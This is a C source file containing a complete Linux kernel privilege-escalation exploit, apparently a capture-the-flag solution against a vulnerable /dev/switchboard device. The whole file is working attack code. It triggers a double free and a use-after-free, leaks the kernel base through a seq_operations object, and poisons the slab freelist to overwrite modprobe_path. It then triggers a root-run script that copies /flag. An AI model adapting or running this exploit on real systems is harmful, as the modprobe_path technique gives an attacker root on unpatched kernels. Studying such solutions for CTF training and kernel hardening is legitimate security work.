#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <inttypes.h>
#include <string.h>

#define VULN_DEVICE "/dev/switchboard"
#define BUF_SIZE 32
#define RST 0x10
#define OBJ_SELECT 0x30
#define OBJ_NEW 0x40

#define MODPROBE_OFF 0x1850b20ULL
#define SINGLE_START_OFF 0x2531a0ULL

static int fd;
static int count = 0;

static int dev_free(int index){
    return ioctl(fd, RST, index);
}

static int dev_create(){
    ioctl(fd, OBJ_NEW, NULL);
    return count++;
}

static void dev_write(void *buffer, ssize_t len){
    write(fd, buffer, len);
}

static void dev_read(void *buffer, ssize_t len){
    read(fd, buffer, len);
}

static int dev_select(int index){
    return ioctl(fd, OBJ_SELECT, index);
}

static int dev_open(char* file, int flags){
    int f;

    if ((f = open(file, flags)) < 0){
        perror("[-] Error opening device");
        exit(1);
    }

    printf("[*] Opened device\n");

    return f;
}

static void logleak(char *name, uint64_t addr){
    printf("[*] %s => %#lx\n", name, addr);
}

static void write_file(const char *file, const char *data, mode_t mode){
    int f = open(file, O_WRONLY | O_CREAT | O_TRUNC, mode);
    if (f < 0){
        perror("open");
        exit(1);
    }

    if ((write(f, data, strlen(data))) < 0){
        perror("write");
        exit(1);
    }

    close(f);
}

int main(int argc, char** argv){
    fd = dev_open(VULN_DEVICE, O_RDWR);

    int node0 = dev_create(); // 0
    int node1 = dev_create(); // 1
    printf("[*] Created nodes\n");

    usleep(20000);

    dev_select(node0);
    dev_free(node0); // inuse = 0 // el free esta en 0xffffffffc000043b
    dev_free(node0); // kfreed once
    dev_free(node0); // kfreed twice
    usleep(20000);
    uint64_t buf[4] = {0};

    dev_write(buf, 0x8); // allocate the double freed chunk once and set inuse==1

    usleep(5000);
    int seq_ops = open("/proc/self/stat", O_RDONLY); // allocate again (uaf) into freed chunk


    printf("[!] Allocated seq_operations object! Leaking...\n");
    uint64_t leak[3] = {0};

    dev_read(leak, 0x8);
    
    logleak("single start", leak[0]);

    uint64_t kbase = leak[0] - SINGLE_START_OFF;
    uint64_t modprobe_path = kbase + MODPROBE_OFF;
    logleak("kbase", kbase);
    logleak("modprobe", modprobe_path);

    
    close(seq_ops);


    dev_free(node0); // inuse = 0;
    dev_free(node0);

    usleep(15000);

    buf[2] = modprobe_path;

    printf("[+] Tampering free list with modprobe_path\n");
    dev_write(buf, 0x18); // tamper freelist with modprobe_path

    dev_free(node0);
    dev_select(node1);
    dev_free(node1); // set inuse = 0
    dev_free(node1); // free once to place it in the top of the freelist

    usleep(15000);

    printf("[+] Allocating last nodes...\n");
    int node2 = dev_create(); // kzalloc para buf y kzalloc para devices, falta 1 que sera en modprobe

    printf("[+] Overwriting modprobe_path\n");
    char* new_path = "/tmp/x\x00\x00";
    dev_write(new_path, sizeof(new_path));

    printf("[*] Done! Creating scripts...\n");
    const char script[] = "#!/bin/sh\ncat /flag > /tmp/win\nchmod 644 /tmp/win";
    write_file("/tmp/x", script, 0777);

    const unsigned char magic[] = {0xff, 0xff, 0xff, 0xff};
    write_file("/tmp/dummy", (char*)magic, 0777);
    system("/tmp/dummy >/dev/null 2>&1");

    FILE *fp = fopen("/tmp/win", "r");
    if (!fp){
        perror("fopen flag");
        return 1;
    }

    char flag[0x100] = {0};

    if(fgets(flag, sizeof(flag), fp)){
        printf("[*] Flag: %s", flag);
    }

    fclose(fp);
    close(fd);

    return 0;
}
